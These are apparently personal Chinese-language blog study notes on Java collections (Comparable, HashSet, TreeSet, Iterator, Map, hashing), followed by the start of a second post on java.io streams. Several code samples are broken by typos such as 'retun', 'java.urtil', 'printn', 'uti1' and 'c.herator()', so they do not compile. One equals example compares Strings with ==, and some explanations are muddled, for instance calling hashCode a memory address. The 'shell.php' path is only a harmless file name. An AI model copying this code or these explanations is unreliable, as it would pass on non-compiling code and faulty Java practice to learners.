<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.urtil.Collections;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果把implements Comparable注释掉了，则程序编译时没有错误，但运行时会报错</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Comparable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(<span class="keyword">int</span> id, String name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        retun <span class="string">&quot;id:&quot;</span> + id + <span class="string">&quot;,name:&quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Object o)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Person p= (Person)o;</span><br><span class="line">        retun <span class="keyword">this</span>.id - p.id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestComparableQuestion</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">         ArrayList c = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    	 c.add(<span class="keyword">new</span> Person(<span class="number">1000</span>, <span class="string">&quot;zhangsan&quot;</span>));</span><br><span class="line">         c.add(<span class="keyword">new</span> Person(<span class="number">1002</span>, <span class="string">&quot;wangwu&quot;</span>));</span><br><span class="line">         java.util.Collections.sort(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Comparabel接口介绍"><a href="#Comparabel接口介绍" class="headerlink" title="Comparabel接口介绍"></a>Comparabel接口介绍</h3><ul>
<li><p>问题：上面的算法根据什么确定容器中对象的”大小”顺序?</p>
</li>
<li><p>所有可以”排序”的类都实现了java. lang.Comparable接口,Comparable接口中只有一个方法</p>
<ul>
<li>public int compareTo(Object obj);<ul>
<li>该方法<ul>
<li>返回 0 表示 this == obj</li>
<li>返回正数表示 this &gt; obj</li>
<li>返回负数表示 this &lt; obj</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>这个数值位置固定，值可以重复</p>
</li>
<li><p>实现了Comparable接口的类通过实现comparaTo方法从而确定该类对象的排序方式。</p>
</li>
</ul>
<h1 id="Set接口介绍"><a href="#Set接口介绍" class="headerlink" title="Set接口介绍"></a>Set接口介绍</h1><ul>
<li>Set接口是Collection的子接口，Set接口没有提供额外的方法，但实现Set接口的容器类中的元素是没有有顺序的，而且不可以重复。</li>
<li>Set容器可以与数学中“集合”的概念相对应。</li>
<li>J2SDK API中所提供的Set容器类有HashSet，TreeSet等。</li>
</ul>
<h2 id="HashSet类"><a href="#HashSet类" class="headerlink" title="HashSet类"></a>HashSet类</h2><ul>
<li><p>HashSet类实现了Set接口</p>
</li>
<li><p>HashSet容器中的元素是不能重复，无顺序的</p>
</li>
<li><p>存放入 HashSet 容器中的类必须要实现equals()和hahsCode方法</p>
</li>
<li><p><strong>如果要把一个对象放，set接口的实现类的对象里去，必须重构equals和hashcode方法</strong></p>
<p><strong>才能保证set容器中元素没有重复</strong></p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object ob)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Student st = (Student)ob;</span><br><span class="line">	<span class="keyword">return</span> st.id == <span class="keyword">this</span>.id &amp;&amp; st.name == <span class="keyword">this</span>.name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> id * <span class="keyword">this</span>.name.hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="equals-和-hashCode-方法的使用"><a href="#equals-和-hashCode-方法的使用" class="headerlink" title="equals 和 hashCode 方法的使用"></a>equals 和 hashCode 方法的使用</h3><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ol>
<li><p>什么类要重写，equals 和 hashCode ，什么类不需要重写</p>
</li>
<li><p>为什么要重写</p>
</li>
<li><p>如何重写</p>
</li>
</ol>
<p>TreeSer 是否需要</p>
<p>答：什么类要充当容器时，添加到容器对象，必须要实现</p>
<p>容器是集合：一个可以用来存放其他类对象的类，这种类就叫集合或容器</p>
<h4 id="重写hashCode方法的必要"><a href="#重写hashCode方法的必要" class="headerlink" title="重写hashCode方法的必要"></a>重写hashCode方法的必要</h4><p><img src="/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/%E7%A4%BA%E4%BE%8B.png"></p>
<p><strong>如果是java定义的类有重写 hashCode()，如果是自己定义的类他没有重写hashCode()</strong></p>
<ul>
<li>String和 Integer这些Java自带的类都重写了hashCode方法，如果String和 Integer new出来的对象的内容是一样的，则这些对象的hashCode返回值也是一样的，尽管这些对象占用的是不同的内存</li>
<li>不过用户自定义类型则不同，如本程序的A类，即便是两个内容一模一样的A类对象，它们返回的hashCode值也是不一样的，但是两个内容一模一样的Integer类对象或者String类对象返回的hashCode值却是一样的，因为系统自带的String和Integer类都已经重写了Object的hashCode方法嘛</li>
<li>如果程序员希望自己定义的类对象，占用不同内存空间但内容却是一样的对象调用hashCode方法返回值是一样的，则程序员就必须自己重写hashCode方法，如本程序的B类</li>
</ul>
<h4 id="什么容器必须的重写equals方法和hashCode方法"><a href="#什么容器必须的重写equals方法和hashCode方法" class="headerlink" title="什么容器必须的重写equals方法和hashCode方法"></a>什么容器必须的重写equals方法和hashCode方法</h4><ul>
<li>添加到HashMap和Hashtable容器中的<strong>键</strong>必须的同时实现equals()方法和hashCode()方法，否则很可能导致容器中出现重复的映射，所谓重复映射是指同一个键值映射在容器中出现了多次</li>
<li>添加到HashSet容器中的<strong>对象</strong>也必须得同时实现equals()方法和hashCode()方法，否则很可能导致容器中出现重复的对象</li>
<li>更抽象的讲: <strong>Hashtable Ha shSet HashMap都必须的同时实现equals()方法和hashCode()方法, TreeSet和TreeMa p则不需要实现equals()方法和hashCode()方法</strong></li>
</ul>
<h4 id="HashCode存储"><a href="#HashCode存储" class="headerlink" title="HashCode存储"></a>HashCode存储</h4><p><img src="/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/%E5%AD%98%E5%82%A8%E5%9B%BE.png"></p>
<p>​    aa根据hashCode找到他存放的位置，然后通过equals方法判断后面是否有根aa对象相同的对象，有则不存放，没有则放，S容器自身不存放对象本身，存放的是地址，地址后面连接了很多元素，根据算法，不同的值不能找到相同的地址</p>
<p>​    不同的new has值是不同的，只要一重写就不是它的地址了，</p>
<p>为什么要重写equals方法</p>
<p>​    需要用eq判断两个对象是否相等，没有重写两个对象的equals是fas，以哈希表为内部存储方式的容器里面，才需要重写里面的hashCode 和 equals，HahSet也要重写，TreeSet不需要重写，因为内部算法不是hash表</p>
<h4 id="什么类必须得重写equals-和hashCode-方法"><a href="#什么类必须得重写equals-和hashCode-方法" class="headerlink" title="什么类必须得重写equals()和hashCode()方法"></a>什么类必须得重写equals()和hashCode()方法</h4><p>Hashtable HashSet HashMap都必须的同时实现equals()方法和hashCode()方法</p>
<p>TreeSet和TreeMap则不需要实现equals ()方法和hashCode()方法</p>
<h4 id="为什么要重写equals-和hashCode-方法"><a href="#为什么要重写equals-和hashCode-方法" class="headerlink" title="为什么要重写equals()和hashCode()方法"></a>为什么要重写equals()和hashCode()方法</h4><ul>
<li>预备知识：</li>
<li>散列码：<ul>
<li>Object中的hashCode方法会返回该对象的内存真实地址的整数化表示，这个形象的不是真正地址的整数值就是哈希码</li>
</ul>
</li>
<li><strong>向HashSet中添加对象时，HashSet先通过该对象的hashCode()计算出相应的桶,然后再根据equals()方法找到相应的对象。如果容器中己存在该对象则不再添加，如果不存在,则添加进去</strong></li>
</ul>
<p>（桶排序）</p>
<h4 id="怎样重写equals-和hashCode-方法"><a href="#怎样重写equals-和hashCode-方法" class="headerlink" title="怎样重写equals()和hashCode()方法"></a>怎样重写equals()和hashCode()方法</h4><h5 id="如何重写equals"><a href="#如何重写equals" class="headerlink" title="如何重写equals()"></a>如何重写equals()</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    如果<span class="keyword">this</span>和Obj的内容是一摸一样的</span><br><span class="line">    	返回<span class="keyword">true</span></span><br><span class="line">    否则</span><br><span class="line">    	返回<span class="keyword">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="如何重写hashCode-方法"><a href="#如何重写hashCode-方法" class="headerlink" title="如何重写hashCode()方法"></a>如何重写hashCode()方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> 当前类中基本类型数据对象的hashCode()方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="例子没复制待完善"><a href="#例子没复制待完善" class="headerlink" title="例子没复制待完善"></a>例子没复制待完善</h1><h1 id="lterator接口（通过这个接口遍历数据）"><a href="#lterator接口（通过这个接口遍历数据）" class="headerlink" title="lterator接口（通过这个接口遍历数据）"></a>lterator接口（通过这个接口遍历数据）</h1><p><img src="/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/lterator%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p>
<ul>
<li><p>boolean hasNext();</p>
<ul>
<li>是用来判断必前游标的后面还是否存在元素，如果存在返回真，否则返回假</li>
</ul>
</li>
<li><p>Object next();</p>
</li>
<li><p>先返回当前游标右边的元素，然后游标后移一个位置void remove()</p>
<ul>
<li>删除最近返回的元素,在调用remove之前，我们至少保证先调用一次next方法,而且调用next之后只能调用一次remove方法</li>
<li>remove()方法不推荐使用</li>
</ul>
</li>
<li><p>关键是<strong>游标初始位置是不是在第一个元素前面</strong>，remove之前必须调用next，一次next一次remove</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java. uti1.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestIterator_1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//可以遍历所有Collection接口的实现类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">showCollection</span><span class="params">(Collection c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	Iterator it = c.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext())</span><br><span class="line">        &#123;</span><br><span class="line">        	System.out.printn(it.next());</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ArrayList al = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        al.add(<span class="string">&quot;one&quot;</span>);</span><br><span class="line">        al.add(<span class="number">22</span>);</span><br><span class="line">        al.add(<span class="keyword">new</span> Point (<span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;al容器的内容是:&quot;</span>);</span><br><span class="line">        showCollection(al);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    实现了collection接口就可以遍历，It是游标， 想把容器中的所有元素都输出调用容器对象的iterator方法，方法已经实现好，返回的是一个班指针，写hasNext就知道下面有没有元素，如果有写next会返回元素。指针后移</p>
<h2 id="TreeSet类"><a href="#TreeSet类" class="headerlink" title="TreeSet类"></a>TreeSet类</h2><ul>
<li>TreeSet类实现了Set接口</li>
<li>TreeSet是一个有序集合，TreeSet中元素将按照升<strong>序排列</strong>，缺省是按照自然顺序进行排列，因此TreeSet中元素要实现Comparable接口</li>
<li>记住:所有可以进行排序的类都应该实现Comparable接口</li>
</ul>
<h5 id="TreeSet实例（以树为核心）"><a href="#TreeSet实例（以树为核心）" class="headerlink" title="TreeSet实例（以树为核心）"></a>TreeSet实例（以树为核心）</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Collection c = <span class="keyword">new</span> TreeSet();</span><br><span class="line">c.add(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">c.add(<span class="string">&quot;456&quot;</span>);</span><br><span class="line">c.add(<span class="string">&quot;234&quot;</span>);</span><br><span class="line">c.add(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">c.add(<span class="string">&quot;678&quot;</span>);</span><br><span class="line"></span><br><span class="line">lterator i = c.herator();</span><br><span class="line"><span class="keyword">while</span> (i.hasNext())</span><br><span class="line">&#123;</span><br><span class="line">	System.out.printIn(i.next());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="HashSet和TreeSet的比较"><a href="#HashSet和TreeSet的比较" class="headerlink" title="HashSet和TreeSet的比较"></a>HashSet和TreeSet的比较</h4><ul>
<li>HashSet是基于Hash算法实现的，其性能通常都优于</li>
<li>TreeSet。我们通常都应该使用HashSet，在我们需要排序的功能时，我们才使用TreeSet</li>
</ul>
<h1 id="Map接口"><a href="#Map接口" class="headerlink" title="Map接口"></a>Map接口</h1><p>java.util.Map接口描述了映射结构，Map结构允许以键集、值集合或键-值映射关系集的形式查看某个映射的内容。**(字典)**</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Object <span class="title">put</span><span class="params">(Object key, Object value)</span></span></span><br><span class="line"><span class="function">Object <span class="title">get</span><span class="params">(Object key)</span></span></span><br><span class="line"><span class="function">	注意Map接口中并没有 Object <span class="title">get</span><span class="params">(Object value)</span></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">containsKey</span><span class="params">(Object key)</span></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">containsValue</span><span class="params">(Object value)</span></span></span><br></pre></td></tr></table></figure>

<p>哈希冲突，越界【K5隐射到很远 不在容器，越界了】</p>
<p><img src="/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/%E5%93%88%E5%B8%8C%E5%86%B2%E7%AA%81%E8%B6%8A%E7%95%8C.png"></p>
<p>我们希望每个元素印射不一样，希望每个元素映射的地址连续</p>
<p>哈希因子</p>
<p>空间百分之75满了，会自动扩充，如果继续放会元素引起哈希冲突</p>
<p> 要求</p>
<ol>
<li><p>哈希因子不能过高</p>
</li>
<li><p>冲突如何解决，放在容器后</p>
</li>
</ol>
<h2 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h2><ul>
<li>哈希表的定义:<ul>
<li>哈希表不是只存储需要保存的数据，而是既保存数据，也保存该数据的主键，实际是:先保存主键，然后哈希表会根据某种算法自动计算出以当前主键为主键的数据的存储位置，然后再把该数据保存进去</li>
</ul>
</li>
<li>哈希表:<ul>
<li>假设待保存的数据是val, val的主键是key，则哈希表是先存储key，然后哈希表会自动根据key计算出val的存储位置，并最终把val存储进去</li>
</ul>
</li>
<li>哈希表注意事项：<ul>
<li> Hash即哈希表又称散列表-</li>
<li>Hash中不允许存在重复的键</li>
<li>哈希表主要是为了提高数据的存储速度和查找速度而设计的</li>
<li>哈希表是人类的一种追求，人很难设计出完美的哈希表</li>
<li>几乎所有的哈希表都会产生哈希冲突</li>
<li>Java中是利用桶来解决哈希冲突的</li>
</ul>
</li>
</ul>
<h2 id="Map接口-1"><a href="#Map接口-1" class="headerlink" title="Map接口"></a>Map接口</h2><ul>
<li>Map（映射）是一种把键对象和值对象进行映射的集合，它的每一个元素都包含一对键对象和值对象。</li>
<li>向Map集合中加入元素时，必须提供一对键对象和值对象，从Map集合中检索元素时，只要给出键对象，就会返回对应的值对象。</li>
<li>接口Map提供了根据关键字找对应的值的方法get(),定义如下:object get(Object key)</li>
</ul>
<h2 id="Map接口方法介绍"><a href="#Map接口方法介绍" class="headerlink" title="Map接口方法介绍"></a>Map接口方法介绍</h2><p>接口Map还提供了设置关键字和对应值的方法put()，定义如下;</p>
<ul>
<li></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Object <span class="title">put</span><span class="params">(Object key,Object value)</span></span></span><br><span class="line"><span class="function">	根据key计算出存储位置，然后把value存入此位置，如果该位置原来己有元素，则覆盖它该方法返回覆盖之前的元素对象的值，如果以前此位置为空，则返回<span class="keyword">null</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putAll</span><span class="params">(Map m)</span></span>;</span><br><span class="line">  把m容器中所有的元素存入当前容器</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">containsKey</span><span class="params">(Object key)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">containsValue</span><span class="params">(Object value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">Object <span class="title">remove</span><span class="params">(Object key)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/map%E7%A4%BA%E4%BE%8B%E5%9B%BE1.png"></p>
<p><img src="/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/map%E7%A4%BA%E4%BE%8B%E5%9B%BE2.png"></p>
<p><img src="/2021/04/20/Java-10%E5%AE%B9%E5%99%A8/map%E7%A4%BA%E6%84%8F%E5%9B%BE3.png"></p>
<ul>
<li><strong>在容器里所有东西都必须是对象</strong></li>
<li>指针所指的位置是元素前的位置</li>
<li>next()执行时是划过元素</li>
<li>it.next() 返回是是父类，需要转换</li>
<li>无论什么容器，内部的所有元素必须是对象，不能是基本类型数据</li>
<li>为什么可以放基本类型数据，因为进行了默认进行一个自动封装</li>
</ul>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-Java-9流"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2021/04/19/Java-9%E6%B5%81/"
    >Java 9流</a> 
</h2>
 

    </header>
     
    <div class="article-meta">
      <a href="/2021/04/19/Java-9%E6%B5%81/" class="article-date">
  <time datetime="2021-04-19T02:32:08.000Z" itemprop="datePublished">2021-04-19</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Java/">Java</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="流的定义"><a href="#流的定义" class="headerlink" title="流的定义"></a>流的定义</h1><ul>
<li><strong>流就是程序和设备之间嫁接起来的一根用于数据传输的管道</strong>，这个管道上有很多按钮,不同的按钮可以实现不同的功能</li>
<li>这根带按钮的用于数据传输的管道就是流</li>
<li><strong>流就是一根管道</strong></li>
<li>流是管道，<strong>程序和设备嫁接起来的用于数据传输的管道</strong></li>
<li>管道上有很多的按钮，不同按钮对应不同方法，调用不同方法就是按下不同按钮</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileReader fr = <span class="keyword">new</span> FileReader(<span class="string">&quot;D:\\shell.php&quot;</span>); <span class="comment">//流对象产生，一根管子（fr）从文件指向程序</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/19/Java-9%E6%B5%81/%E6%B5%81.png"></p>
<p><img src="/2021/04/19/Java-9%E6%B5%81/%E6%B5%81%E7%A4%BA%E6%84%8F%E5%9B%BE1.png"></p>
<p><img src="/2021/04/19/Java-9%E6%B5%81/%E6%B5%81%E7%A4%BA%E6%84%8F%E5%9B%BE2.png"></p>
<h1 id="流的分类标准"><a href="#流的分类标准" class="headerlink" title="流的分类标准"></a>流的分类标准</h1><p>java.io 包中定义了多个流类型(类或抽象类)来实现输入/输出功能；可以从不同的角度对其进行分类；</p>
<p>​    按数据流的方向不同可以分为输入流和输出流。</p>
<p>​    按处理数据单位不同可以分为字节流和字符流</p>
<p>​    按照功能不同可以分为节点流和处流。</p>
<p>J2SDK 所提供的所有流类型位于包 java.io 内都分别继承自以下四种抽象流类型。</p>
<table>
<thead>
<tr>
<th></th>
<th>字节流</th>
<th>字符流</th>
</tr>
</thead>
<tbody><tr>
<td>输入流</td>
<td>Inputstream</td>
<td>Reader</td>
</tr>
<tr>
<td>输出流</td>
<td>outputstream</td>
<td>Writer</td>
</tr>
</tbody></table>
<p>节点流可以是原始流</p>
<p>包裹流：对原始流的加工处理，外部提供一些功能更加强大、人性化的按钮</p>
<p>字节流：一个一个发送</p>
<p>字符流：两个一起发送</p>
<h1 id="节点流与处理流"><a href="#节点流与处理流" class="headerlink" title="节点流与处理流"></a>节点流与处理流</h1><p><img src="/2021/04/19/Java-9%E6%B5%81/%E8%8A%82%E7%82%B9%E6%B5%81%E4%B8%8E%E5%A4%84%E7%90%86%E6%B5%81.png"></p>
<h2 id="必须掌握的知识点"><a href="#必须掌握的知识点" class="headerlink" title="必须掌握的知识点"></a>必须掌握的知识点</h2><ul>
<li>什么叫流</li>
<li>流与类的关系<ul>
<li>如果一个类是用作设备和程序之间的数据传输，则这个类有一个新的名字叫流</li>
<li>流一定是类，但类不一定是流</li>
</ul>
</li>
<li>原始流与包裹流关系</li>
</ul>
<h1 id="四大基本抽象流"><a href="#四大基本抽象流" class="headerlink" title="四大基本抽象流"></a>四大基本抽象流</h1><ul>
<li><code>InputStream</code> <code>OutputStream</code> <code>Reader</code> <code>Writer</code> 这四个类都是抽象类</li>
<li>凡是以<strong>stream</strong>结尾的都是字节流</li>
</ul>
<h2 id="InputStream流中常用的方法"><a href="#InputStream流中常用的方法" class="headerlink" title="InputStream流中常用的方法"></a>InputStream流中常用的方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">	读取一个字节并以整数形式返回</span></span><br><span class="line"><span class="function">	如果读取到输入流的末尾则返回-1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">(<span class="keyword">byte</span>[] b)</span> <span class="keyword">throws</span> lOException</span></span><br><span class="line"><span class="function">	从输入流中读取一定数量的字节，并将其存储在缓冲区数组b中。以整数形式返回实际读取的字节数</span></span><br><span class="line"><span class="function">	如果b的长度为0，则不读取任何字节并返回0</span>;如果因为流位于文件末尾而没有可用的字节，则返回值-<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">例子:</span><br><span class="line">	FilelnputStream fis = <span class="keyword">new</span> FilelnputStream(<span class="string">&quot;d:\\share\\errorlog.txt&quot;</span>); </span><br><span class="line">	len = fis.read(buf); <span class="comment">//从fis流所关联的d:\\share\\errorlog.txt文件中读取数据，并将读取出来的数据写入buf数组中，返回值是实际写入buf数组的字节个数,如果读取到文件的结尾，则返回-1</span></span><br><span class="line">[文件读完写入buf，Len记录着返回的字节个数]</span><br></pre></td></tr></table></figure>

<p><code>public int read(byte[] b, int off, int len) throws lOException</code></p>
<ul>
<li>从输入流中最多读取len个字节的数据并存入 byte数组中</li>
<li>b表示读取的数据要存入的数组的名字</li>
<li>off表示第一个读出的数据要存入的位置,是下标</li>
<li>len表示最多能读取的字节数</li>
<li>将从输入流所关联到的设备中读取的第一个字节存储在元素b[off]中，下一个字节存储在b[off+1]中，依次类推。读取的字节数最多等于len</li>
<li>尝试读取len个字节,但读取的字节也可能小于该值。以整数形式返回实际读取的字节数。</li>
<li>如果读到了文件的末尾,则返回-1</li>
</ul>
<p><code>void close() throws lOException</code></p>
<p>​    关闭此输入流并释放与该流关联的所有系统资源</p>
<p><code>long skip(long n) throws lOException</code>    </p>
<p>​    跳过和丢弃此输入流中数据的n个字节。(很少用)</p>
